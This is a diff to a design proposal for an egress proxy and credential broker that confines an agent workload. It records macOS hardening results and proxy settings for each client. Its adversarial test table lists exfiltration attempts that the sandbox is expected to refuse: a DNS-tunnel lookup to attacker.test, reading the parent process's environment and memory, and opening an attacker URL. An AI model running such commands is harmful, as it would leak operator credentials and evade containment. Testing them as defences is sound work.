@@ -1,6 +1,6 @@
 # FEP-6 (landed): the egress engine, an in-process Rust HTTP(S) proxy inside the Gateway
 
-**Formwork Enhancement Proposal 6 — landed, macOS characterization owed.** Companion to
+**Formwork Enhancement Proposal 6 — landed on both platforms.** Companion to
 `formwork.md` (design + end-to-end spec), `constitution.md` (doctrine), `docs/fep-1.md` (what
 host-scoped egress permits) and `docs/fep-5.md` (how a confined connection reaches the Gateway, the
 host-rule grammar, inspection and brokering). Motivated by the Omnigent comparison in
@@ -18,9 +18,9 @@ every departure from the text below, and what is still owed. The requirements (�
 are defined here, anchored, and code cites them bare. The §9 amendments are applied to `formwork.md`,
 `constitution.md`, `docs/fep-1.md`, `docs/fep-5.md`, the shipped examples and the README, with
 the FEP-5 verbs `https:` and `any:` replaced outright, not aliased: no release has shipped them.
-What remains is the macOS characterization of `FW-CRED16`'s debugger denial, the run-level egress
-tests and client matrix on macOS (`FW-E2E-094` runs on Linux), and the latency budget
-(`FW-E2E-096`); until they run, the report keeps `credential-broker` `Partial` on macOS. Identifiers continue FEP-5's sequences: FEP-5 anchored up to
+The macOS characterization of `FW-CRED16` and the run-level egress tests, client matrix included,
+run on `macos-14` and `macos-15` (`docs/macos-characterization.md`); the latency budget
+(`FW-E2E-096`) and the integrated scenario forms remain. Identifiers continue FEP-5's sequences: FEP-5 anchored up to
 `FW-EGR15`, `FW-CRED15`, `FW-FID11`, `FW-BP15`, `FW-INV14`, `FW-E2E-091` and `FW-ADV-020`, and
 FEP-4 drafted `FW-INV12` and `FW-DISC7`–`FW-DISC10`; this FEP mints `FW-EGR16`–26, `FW-CRED16`–19,
 `FW-BP16`, `FW-FID12`–13, `FW-INV15`, `FW-E2E-092`–106 and `FW-ADV-021`–025. §7.2 walks through
@@ -465,7 +465,12 @@ mechanisms.
 **Custody.** While the vault holds any credential, the Gateway process is not dumpable: on Linux
 `prctl(PR_SET_DUMPABLE, 0)`, which makes reading its memory through `/proc/<pid>/mem` or `ptrace`
 require `CAP_SYS_PTRACE` whatever Yama and Landlock decide; on macOS `ptrace(PT_DENY_ATTACH)`
-**(characterize)** (`FW-CRED16`). The flag is set before the workload is spawned, because the
+(characterized: `lldb` attaches to a plain process on the runners and fails to attach to the
+brokering Gateway) (`FW-CRED16`). *Amended on characterization (C5):* on macOS the Gateway's
+exec-time environment, which holds the operator's key, is readable by any same-uid process through
+`kern.procargs2`, which Seatbelt does not mediate and `PT_DENY_ATTACH` does not cover; `formwork`
+therefore zeroes its exec-time environment first thing in `main`, and a confined workload reads it
+blank. The flag is set before the workload is spawned, because the
 process's own environment, readable through `/proc/<pid>/environ` by a same-uid process, holds an
 env-sourced credential from the moment `formwork run` starts; a non-dumpable process's `/proc`
 entries belong to root. The confined child is unaffected, since `execve` resets the flag for the new
@@ -591,11 +596,13 @@ variable set in FEP-5 §3.1 needs two additions, listed in §9 (c):
 | Client | Proxy variables | Trust variable | Notes |
 |---|---|---|---|
 | curl, git (libcurl) | `https_proxy`, `http_proxy` (lowercase) | `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO`, `SSL_CERT_FILE` | git pushes chunked bodies above 1 MiB |
-| Python `requests`, `httpx`, `urllib`, pip | either case | `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, `PIP_CERT` | |
+| Python `requests`, `httpx`, `urllib`, pip | either case | `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, `PIP_CERT` | pip on macOS verifies through `truststore`, which takes the bundle's CA certificates as anchors |
 | Node `fetch`, `http`, `https`, npm | with `NODE_USE_ENV_PROXY=1` | `NODE_EXTRA_CA_CERTS` | versions above |
 | Go `net/http` (`gh`) | either case | `SSL_CERT_FILE` on Linux; ignored on macOS | FEP-5 §3.2 platform-verifier caveat |
-| uv | either case | `SSL_CERT_FILE` with `UV_NATIVE_TLS=1` | FEP-5 §3.2 |
-| cargo, rustup | **(characterize)** | **(characterize)** | |
+| uv | either case | `SSL_CERT_FILE` (uv 0.8; older releases with `UV_NATIVE_TLS=1`) | amended: found by `FW-E2E-094` |
+| cargo | `https_proxy` (either case) | `CARGO_HTTP_CAINFO`, which the Launcher sets (amended: found by `FW-E2E-094`) | |
+| rustup | `https_proxy` (either case) | `SSL_CERT_FILE` on Linux; ignored on macOS | the platform verifier, like Go on macOS (characterized) |
+| Swift `URLSession` (macOS) | `https_proxy` | ignored: the keychain only | like Go on macOS |
 
 A client that ignores the CA variables fails its handshake against an inspected host, and the
 operator line suggests `tunnel:` for that host (S1, variant). `FW-E2E-094` turns this table into a
@@ -1121,7 +1128,7 @@ design.
 | 5 | carry the placeholder in a query | `curl -sS "https://other.test/?k=$FIXTURE_MODEL_KEY"` | `403`; violation `placeholder` | placeholder scan |
 | 6 | raw socket to an address | `python3 -c 'import socket; socket.create_connection(("198.51.100.7", 443))'` | `PermissionError`; refusal record | supervisor (Linux), Seatbelt (macOS) |
 | 7 | DNS tunnel | `python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)'` and `getaddrinfo("c2VjcmV0.attacker.test", 53)` | `PermissionError`; `gaierror` | FEP-5 `FW-ISO11`, `FW-EGR12` |
-| 8 | read the Gateway's environment or memory | `cat /proc/$PPID/environ`; `head -c1 /proc/$PPID/mem` (Linux); `ps -E -p $PPID` (macOS) | permission denied on Linux; no environment shown on macOS **(characterize)** | `FW-CRED16`; FEP-5 `FW-ISO16` |
+| 8 | read the Gateway's environment or memory | `cat /proc/$PPID/environ`; `head -c1 /proc/$PPID/mem` (Linux); `kern.procargs2` of `$PPID` (macOS: `ps` is setuid and cannot run in a session) | permission denied on Linux; on macOS the environment reads blank, because `formwork` zeroes it (characterized, C5) | `FW-CRED16`; FEP-5 `FW-ISO16` |
 | 9 | front a blocked host behind an admitted name | `fw-egress-probe inspect model.test:443 --host attacker.test` | `403`; violation `host-mismatch` | FEP-5 `FW-EGR10` |
 | 10 | ask a host service to fetch | `xdg-open "https://attacker.test/?d=1"` (Linux), `open` (macOS) | refused; `attacker.test` logs nothing | FEP-5 channel baseline (`FW-ADV-020`) |
 | 11 | send code to the model host | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" -d @src/main.rs https://model.test/v1/messages` | succeeds | admitted by design: an admitted host receives what the agent sends; the floor and the environment scrub bound what the agent has |
@@ -1296,7 +1303,7 @@ where.
 
 ## 8. Comparison after this FEP
 
-Conditional on FEP-5's transport landing and on the **(characterize)** marks above.
+As built on both platforms; the client-side name-constraint behavior is recorded by `FW-E2E-094`.
 
 | Property | Omnigent | Formwork engine |
 |---|---|---|
